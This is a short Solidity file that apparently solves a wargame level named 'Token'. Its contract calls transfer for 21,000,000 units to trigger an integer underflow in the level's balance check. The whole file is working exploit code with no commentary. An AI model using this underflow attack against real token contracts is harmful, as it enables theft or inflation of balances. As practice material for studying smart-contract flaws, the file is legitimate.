// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Token.sol";

contract TokenAttract{
    function att(address addr) public {
        Token(addr).transfer(addr,21000000);
    }
}